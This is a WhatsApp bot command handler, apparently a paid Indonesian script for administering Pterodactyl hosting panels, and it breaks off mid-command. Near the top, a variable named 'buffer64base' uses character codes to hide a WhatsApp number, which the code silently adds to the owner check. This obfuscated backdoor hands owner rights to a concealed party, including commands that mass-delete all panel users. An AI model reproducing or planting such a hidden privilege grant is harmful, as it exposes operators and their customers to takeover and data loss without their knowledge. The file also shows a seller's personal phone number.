/* tutor pasang db github https://files.catbox.moe/jadchh.mp4 */
const crypto = require("crypto")
const { Client } = require('ssh2');

module.exports = async (syah, m, store, msg) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""
	
const budy = (typeof m.text == 'string' ? m.text : '') 
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await syah.decodeJid(syah.user.id)
const owner = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const adpbos = JSON.parse(fs.readFileSync("./library/database/adpbos.json"))
const adpbos2 = JSON.parse(fs.readFileSync("./library/database/adpbos2.json"))
const adpbos3 = JSON.parse(fs.readFileSync("./library/database/adpbos3.json"))
const adpbos4 = JSON.parse(fs.readFileSync("./library/database/adpbos4.json"))
const adpbos5 = JSON.parse(fs.readFileSync("./library/database/adpbos5.json"))
const resseler = JSON.parse(fs.readFileSync("./library/database/resseler.json"))
const resseler2 = JSON.parse(fs.readFileSync("./library/database/resseler2.json"))
const resseler3 = JSON.parse(fs.readFileSync("./library/database/resseler3.json"))
const resseler4 = JSON.parse(fs.readFileSync("./library/database/resseler4.json"))
const resseler5 = JSON.parse(fs.readFileSync("./library/database/resseler5.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owner].includes(m.sender) ? true : m.isDeveloper ? true : false
const isReseller = resseler.includes(m.sender)
const isReseller2 = resseler2.includes(m.sender)
const isReseller3 = resseler3.includes(m.sender)
const isReseller4 = resseler4.includes(m.sender)
const isReseller5 = resseler5.includes(m.sender)
const isAdpbos = adpbos.includes(m.sender)
const isAdpbos2 = adpbos2.includes(m.sender)
const isAdpbos3 = adpbos3.includes(m.sender)
const isAdpbos4 = adpbos4.includes(m.sender)
const isAdpbos5 = adpbos5.includes(m.sender)
const isBot = botNumber.includes(m.sender)
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson, resize, sleep } = require('./system/function.js')
const pushname = m.pushName || `${m.sender.split("@")[0]}`
m.isGroup = m.chat.endsWith("g.us")
m.metadata = m.isGroup ? (await syah.groupMetadata(m.chat).catch(_ => {}) || {}) : {}
m.isAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == m.sender) || false) : false
m.isBotAdmin = m.metadata && m.metadata.participants ? (m.metadata.participants.find(e => e.admin !== null && e.id == botNumber) || false) : false

// >~~~~~~~~ Fake Quoted ~~~~~~~~~~< //

const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363224727395@newsletter`, newsletterName: `Hore`, jpegThumbnail: "", caption: `Powered By ${namaowner}`, inviteExpiration: 0 }}}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const fkontak = {
	"key": {
        "participant": '0@s.whatsapp.net',
            "remoteJid": "status@broadcast",
		    "fromMe": false,
		    "id": "Halo"
                        },
       "message": {
                    "locationMessage": {
                    "name": `υρтιмє : ${runtime(process.uptime())}`,
                    "jpegThumbnail": ''
                          }
                        }
                      } 

const syahreply = async (teks) => {
    return syah.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: `© Powered by ${namaOwner}`,
                thumbnailUrl: global.image.reply,
                sourceUrl: global.linkGrup
            }
        }
    }, { quoted: qtext });
};
const Reply = async (teks) => {
    return syah.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: botname,
                body: `© Powered by ${namaOwner}`,
                thumbnailUrl: global.image.reply,
                sourceUrl: global.linkGrup
            }
        }
    }, { quoted: qtext });
};
const reaction = async (jidss, emoji) => {
syah.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
// >~~~~~~~~~~ Function ~~~~~~~~~~~< //

const example = (teks) => {
return `\n *ᴋᴀʏᴀ ɢɪɴɪ sʏᴀʜ :*\n *${prefix+command}* ${teks}\n`
}

const capital = (string) => {
return string.charAt(0).toUpperCase() + string.slice(1);
}

if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${m.sender}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${m.isGroup} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
const qfake = {
    key: {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: "B612",
        participant: "0@s.whatsapp.net"
    },
    message: {
        extendedTextMessage: {
            text: `${botname}`,
            matchedText: `${botname}`,
            canonicalUrl: "https://www.whatsapp.com",
            description: `${namaOwner}`,
            title: "WhatsApp",
            previewType: 0
        }
    }
};    

// >~~~~~~~~~ Command ~~~~~~~~~~< //

switch (command) {
case 'menu': {
await syah.sendMessage(m.chat, { react: { text: '⌛', key: m.key } });
let menu = `
> 👋@${m.sender.split("@")[0]}
\`𝘏𝘈𝘓𝘖 𝘚𝘈𝘠𝘈 𝘈𝘋𝘈𝘓𝘈𝘏 𝘉𝘖𝘛 𝘐𝘕𝘚𝘛𝘈𝘓𝘓 𝘗𝘈𝘕𝘌𝘓 𝘗𝘛𝘌𝘙𝘖𝘋𝘈𝘊𝘛𝘠𝘓 𝘜𝘕𝘛𝘜𝘒 𝘔𝘌𝘔𝘉𝘈𝘕𝘛𝘜 𝘈𝘕𝘋𝘈 𝘋𝘈𝘓𝘈𝘔 𝘐𝘕𝘚𝘛𝘈𝘓𝘓 𝘗𝘈𝘕𝘌𝘓 𝘗𝘛𝘌𝘙𝘖𝘋𝘈𝘊𝘛𝘠𝘓\`
  
*\`- INFORMATION BOT\`*
 *⌬ Botname* : 𝘐𝘕𝘚𝘛𝘈𝘓𝘓 𝘗𝘈𝘕𝘌𝘓
 *⌬ Owner* : 𝘚𝘠𝘈𝘏𝘝2𝘋𝘖𝘍𝘍𝘊
 *⌬ Version* : 1.0
 *⌬ Status* : *${syah.public ? "Public" : "Self"}*
--------------------------------------------
sᴇʟʟᴇᴄᴛ ʙᴜᴛᴛᴏɴ ᴘʟᴇᴀsᴇ`;
let buttons = [
            { buttonId: ".installmenu", buttonText: { displayText: "𝘐𝘕𝘚𝘛𝘈 𝘔𝘌𝘕𝘜" } },
            { buttonId: ".owner", buttonText: { displayText: "𝘖𝘞𝘕𝘌𝘙" } }
    ];

    let buttonMessage = {
        image: { 
            url: "https://files.catbox.moe/y1v5qe.jpg",
            gifPlayback: true 
        },
        caption: menu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400565794836@newsletter", 
                newsletterName: "SYAHV2D"
            }
        },
        footer: "© SYAH",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: '𝘚𝘠𝘈𝘏 𝘕𝘐𝘏 𝘋𝘌𝘒𝘚' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title:  "Silahkan Pilih Menu Yang Tersedia",
                    sections: [
                        {
                            title: "© 𝘚𝘠𝘈𝘏",
                            highlight_label: "𝘗𝘖𝘞𝘌𝘙𝘋 𝘉𝘠 𝘚𝘠𝘈𝘏",
                            rows: [
                                { title:  "𝘚𝘊𝘙𝘐𝘗𝘛", description: "𝘉𝘜𝘠 𝘚𝘊", id: `.buysc` },                    
                                { title:  "JPMCH", description: "MENU NEW", id: `.jpmchmenu` },                    
                                { title:  "𝘋𝘖𝘔𝘈𝘐𝘕", description: "𝘋𝘖𝘔𝘈𝘐𝘕 𝘔𝘌𝘕𝘜", id: `.subdomenu` },        
                                { title:  "CPANEL", description: "CPANEL 𝘔𝘌𝘕𝘜", id: `.cpanelmenu` },                             
                                  { title: "𝘛𝘏𝘈𝘕𝘒𝘚 𝘛𝘖𝘖", description: "𝘔𝘈𝘒𝘈𝘚𝘐𝘏", id: `.tqto` }
                            ]
                        }
                    ]
                })
            },
            viewOnce: true
        }
    ];

    buttonMessage.buttons.push(...flowActions);

    await syah.sendMessage(m.chat, buttonMessage, { quoted: m });
};
break
case "cpanelmenu": {
await syah.sendMessage(m.chat, { react: { text: '⌛', key: m.key } });
let monyet = `
┏━━━━「 𝘐𝘕𝘍𝘖𝘙𝘔𝘈𝘚𝘐 」━━⬣      
┃ ▢ 𝙲𝚁𝙴𝙳𝙸𝚃 : SYAHV2DOFFC 
┃ ▢ ʙᴏᴛ ɴᴀᴍᴇ: CPANEL 𝘔𝘌𝘕𝘜
┃ ▢ ᴠᴇʀsɪᴏɴ: 1.0
┃ ▢ sᴛᴀᴛᴜs: *${syah.public ? "Public" : "Self"}*
┗━━━━━━━━━━━━━━━━━━━━━⬣  
┏━━━━「 CPANEL 𝘔𝘌𝘕𝘜 」   
┃ ▢ ADDSELLER 2/3/4/5
┃ ▢ ADDADP 2/3/4/5
┃ ▢ CLEARSERVER v2/v3/v4/v5
┃ ▢ CLEARUSER v2/v3/v4/v5
┃ ▢ 1GB-UNLI v2/v3/v4/v5
┃ ▢ CADMIN v2/v3/v4/v5
┃ ▢ DELSELLER 2/3/4/5
┃ ▢ DELADP 2/3/4/5
┃ ▢ LISTSELLER 2/3/4/5
┃ ▢ LISTADP 2/3/4/5
┗━━━━━━━━━━━━━━━━━━━━━⬣`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "BACK" } }, 
        { buttonId: ".tqto", buttonText: { displayText: "MAKASIH" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: monyet,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420150801545@newsletter",
                newsletterName: "𝘚𝘠𝘈𝘏𝘝2𝘋𝘖𝘍𝘍𝘊"
            }
        },
        footer: "© 𝘚𝘠𝘈𝘏𝘝2𝘋𝘖𝘍𝘍𝘊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await syah.sendMessage(m.chat, buttonMessage, { quoted: qtext });
}
break
case "buysc": {
await syah.sendMessage(m.chat, { react: { text: '💸', key: m.key } });
let teks = `*\`▧ 「 𝘉𝘜𝘠 𝘚𝘊𝘙𝘐𝘗𝘛 𝘐𝘕𝘚𝘛𝘈𝘓𝘓𝘗𝘈𝘕𝘌𝘓𝘟𝘈𝘋𝘋𝘋𝘉? 」\`*
╭────────────────━
┃友 *\`MAU BELI SC INI?\`*
┃
┃- 𝘏𝘈𝘙𝘎𝘈: 25𝘒
┃
┃友 𝘗𝘝 𝘛𝘌𝘓𝘌 𝘖𝘞𝘕𝘌𝘙 : t.me/syahv2doffc
╰────────────────━
BUY SC INI? KLIK BUTTON PAYMENT DIBAWAH`
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "BACK" } }, 
        { buttonId: ".tqto", buttonText: { displayText: "MAKASIH" } },
        { buttonId: ".dana", buttonText: { displayText: "DANA" } },
        { buttonId: ".ovo", buttonText: { displayText: "OVO" } },
        { buttonId: ".gopay", buttonText: { displayText: "GOPAY" } },
        { buttonId: ".proses", buttonText: { displayText: "PROSES" } },
        { buttonId: ".done", buttonText: { displayText: "DONE" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: teks,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420150801545@newsletter",
                newsletterName: "𝘚𝘠𝘈𝘏𝘝2𝘋𝘖𝘍𝘍𝘊"
            }
        },
        footer: "© 𝘚𝘠𝘈𝘏𝘝2𝘋𝘖𝘍𝘍𝘊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await syah.sendMessage(m.chat, buttonMessage, { quoted: qtext });
}
break
case "tqto": {
await syah.sendMessage(m.chat, { react: { text: '🌹', key: m.key } });
let makasih = `*\`▧ 「 𝘔𝘈𝘒𝘈𝘚𝘐𝘏 𝘚𝘌𝘔𝘜𝘈 」\`*
ᴀʟʟᴀʜ (ᴍʏ ɢᴏᴏᴅ)
ᴍʏ ᴋᴇʟᴜᴀʀɢᴀ (SUPPORT)
sʏᴀʜᴠ2ᴅ (DEVELOPER)
ᴋᴇɴɴʏ (CEO)
ᴀʟʟ ᴘᴇɴɢɢᴜɴᴀ sᴄʀɪᴘᴛ
\`TERIMAKASIH UDAH SUPPORT SYAH SEJAUH INI\``
let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "BACK" } }, 
        { buttonId: ".owner", buttonText: { displayText: "OWNER" } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: makasih,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363420150801545@newsletter",
                newsletterName: "𝘚𝘠𝘈𝘏𝘝2𝘋𝘖𝘍𝘍𝘊"
            }
        },
        footer: "© 𝘚𝘠𝘈𝘏𝘝2𝘋𝘖𝘍𝘍𝘊",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await syah.sendMessage(m.chat, buttonMessage, { quoted: qtext });
}
break
case "owner": {
  const ownerNumber = '6282186731670';
  const ownerName = 'S𝘠𝘈𝘏';

  const vCard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;waid=${ownerNumber}:${ownerNumber}
END:VCARD`;

  await syah.sendMessage(m.chat, {
    contacts: {
      displayName: ownerName,
      contacts: [{ vcard: vCard }],
    },
  });

await syah.sendMessage(m.chat, { text: `Hai ${m.sender.split("@")[0]}!! Jika Kamu berminat script ini silahkan chat nomor bang syah` }, { quoted: qtext });
};
break;
case 'tourl' : {
 const fetch = require('node-fetch');
 const FormData = require('form-data');
 const q = m.quoted ? m.quoted : m;
 const mimetype = (q.msg || q).mimetype || q.mediaType || '';
 if (!/webp/.test(mimetype)) {
 syah.sendMessage(m.chat, {
 react: {
 text: '🕒',
 key: m.key,
 }
 });

 try {
 const media = await q.download?.();
 const fileSizeInBytes = media.length;
 const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
 const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
 const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 let ext = mimetype.split('/')[1] || '';
 if (ext) ext = `.${ext}`;
 form.append('fileToUpload', media, `file${ext}`);
 const res = await fetch('https://catbox.moe/user/api.php', {
 method: 'POST',
 body: form
 });
 const result = await res.text();
 const url = result.trim();
 const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
 // Tombol interaktif
            const teks = caption;
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: {
                            body: {
                                text: teks
                            },
                            footer: {
                                text: "© TOURL BY SYAH"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text": "SALIN LINK","copy_code": "${url}"}`
                                    },
                                ],
                            },
                        },
                    },
                },
            }, { quoted: qtext });

            await syah.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
 
 } catch (e) {
 console.error(e);
 syahreply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
 }
 } else {
 syahreply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${usedPrefix + command}*`);
 }
};
 break        
case "cekidch": case "idch": {
await syah.sendMessage(m.chat, { react: { text: "⌛",key: m.key,}}); 
if (!text) return Reply(example("linkchnya mana goblok bet lu?"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await syah.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Verif"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext})
await syah.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break;        
case 'gpt': {
  if (!text) return m.reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let pei = await openai(text, "")
m.reply(pei)
}
break
case 'clearuser': {
    if (!isCreator) return syahreply(mess.owner)

    const argsString = body.trim()
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludeIds.length === 0) {
        return syahreply(`Masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: *.clearuser* , 48, 49, 50`)
    }
    syahreply("Proses penghapusan user 🚀")
    try {
        let users = []
        let page = 1
        while (true) {
            let f = await fetch(`${domain}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break 

            users.push(...res.data)
            page++
        }

        if (users.length === 0) {
            return syahreply('Tidak ada user yang ditemukan.')
        }

        let deletedUsers = []
        let failedUsers = []

        for (let user of users) {
            let u = user.attributes

            if (excludeIds.includes(u.id.toString())) {
                continue
            }

            let deleteUser = await fetch(`${domain}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            })

            if (deleteUser.ok) {
                deletedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            } else {
                failedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            }
        }

        let message = "*Hasil Penghapusan User:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedUsers.length} User*`
        if (deletedUsers.length > 0) {
            message += `\n${deletedUsers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedUsers.length} User*`
        if (failedUsers.length > 0) {
            message += `\n${failedUsers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('Terjadi kesalahan: ' + error.message)
    }
}
break
case 'clearuserv2': {
    if (!isCreator) return syahreply(mess.owner)

    const argsString = body.trim()
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludeIds.length === 0) {
        return syahreply(`Masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: *.clearuser* , 48, 49, 50`)
    }
    syahreply("Proses penghapusan user 🚀")
    try {
        let users = []
        let page = 1
        while (true) {
            let f = await fetch(`${domain2}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break 

            users.push(...res.data)
            page++
        }

        if (users.length === 0) {
            return syahreply('Tidak ada user yang ditemukan.')
        }

        let deletedUsers = []
        let failedUsers = []

        for (let user of users) {
            let u = user.attributes

            if (excludeIds.includes(u.id.toString())) {
                continue
            }

            let deleteUser = await fetch(`${domain2}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey2,
                }
            })

            if (deleteUser.ok) {
                deletedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            } else {
                failedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            }
        }

        let message = "*Hasil Penghapusan User:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedUsers.length} User*`
        if (deletedUsers.length > 0) {
            message += `\n${deletedUsers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedUsers.length} User*`
        if (failedUsers.length > 0) {
            message += `\n${failedUsers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('Terjadi kesalahan: ' + error.message)
    }
}
break
    case 'clearuserv3': {
    if (!isCreator) return syahreply(mess.owner)

    const argsString = body.trim()
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludeIds.length === 0) {
        return syahreply(`Masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: *.clearuser* , 48, 49, 50`)
    }
    syahreply("Proses penghapusan user 🚀")
    try {
        let users = []
        let page = 1
        while (true) {
            let f = await fetch(`${domain3}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey3,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break 

            users.push(...res.data)
            page++
        }

        if (users.length === 0) {
            return syahreply('Tidak ada user yang ditemukan.')
        }

        let deletedUsers = []
        let failedUsers = []

        for (let user of users) {
            let u = user.attributes

            if (excludeIds.includes(u.id.toString())) {
                continue
            }

            let deleteUser = await fetch(`${domain3}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey3,
                }
            })

            if (deleteUser.ok) {
                deletedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            } else {
                failedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            }
        }

        let message = "*Hasil Penghapusan User:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedUsers.length} User*`
        if (deletedUsers.length > 0) {
            message += `\n${deletedUsers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedUsers.length} User*`
        if (failedUsers.length > 0) {
            message += `\n${failedUsers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('Terjadi kesalahan: ' + error.message)
    }
}
break
case 'clearuserv4': {
    if (!isCreator) return syahreply(mess.owner)

    const argsString = body.trim()
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludeIds.length === 0) {
        return syahreply(`Masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: *.clearuser* , 48, 49, 50`)
    }
    syahreply("Proses penghapusan user 🚀")
    try {
        let users = []
        let page = 1
        while (true) {
            let f = await fetch(`${domain4}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey4,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break 

            users.push(...res.data)
            page++
        }

        if (users.length === 0) {
            return syahreply('Tidak ada user yang ditemukan.')
        }

        let deletedUsers = []
        let failedUsers = []

        for (let user of users) {
            let u = user.attributes

            if (excludeIds.includes(u.id.toString())) {
                continue
            }

            let deleteUser = await fetch(`${domain4}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey4,
                }
            })

            if (deleteUser.ok) {
                deletedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            } else {
                failedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            }
        }

        let message = "*Hasil Penghapusan User:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedUsers.length} User*`
        if (deletedUsers.length > 0) {
            message += `\n${deletedUsers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedUsers.length} User*`
        if (failedUsers.length > 0) {
            message += `\n${failedUsers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('Terjadi kesalahan: ' + error.message)
    }
}
break
case 'clearuserv5': {
    if (!isCreator) return syahreply(mess.owner)

    const argsString = body.trim()
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludeIds.length === 0) {
        return syahreply(`Masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: *.clearuser* , 48, 49, 50`)
    }
    syahreply("Proses penghapusan user 🚀")
    try {
        let users = []
        let page = 1
        while (true) {
            let f = await fetch(`${domain5}/api/application/users?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey5,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break 

            users.push(...res.data)
            page++
        }

        if (users.length === 0) {
            return syahreply('Tidak ada user yang ditemukan.')
        }

        let deletedUsers = []
        let failedUsers = []

        for (let user of users) {
            let u = user.attributes

            if (excludeIds.includes(u.id.toString())) {
                continue
            }

            let deleteUser = await fetch(`${domain5}/api/application/users/${u.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey5,
                }
            })

            if (deleteUser.ok) {
                deletedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            } else {
                failedUsers.push(`• ID: ${u.id} (*${u.username}*)`)
            }
        }

        let message = "*Hasil Penghapusan User:*\n"
        message += `\n✅ *Berhasil Dihapus: ${deletedUsers.length} User*`
        if (deletedUsers.length > 0) {
            message += `\n${deletedUsers.join("\n")}`
        }

        message += `\n\n❌ *Gagal Dihapus: ${failedUsers.length} User*`
        if (failedUsers.length > 0) {
            message += `\n${failedUsers.join("\n")}`
        }

        syahreply(message)
    } catch (error) {
        return syahreply('Terjadi kesalahan: ' + error.message)
    }
}
break
case "addseller": case "address": {
    if (!isCreator && !isAdpbos) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/resseler.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return syahreply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    syahreply(`🚀 Selamat! Anda sekarang menjadi RESELLER PANEL!

✨ Keuntungan yang Anda dapatkan:
🔹 CREATE PANEL 1GB-UNLI
🔹 Mendapat hak istimewa sebagai RESELLER 🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;
case "delseller": case "delseller": {
    if (!isCreator && !isAdpbos) return syahreply(mess.owner);
    if (!m.quoted && !text) return syahreply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/resseler.json";
    if (!fs.existsSync(filePath)) return syahreply("⚠️ *Belum ada SELLER tambahan!*");

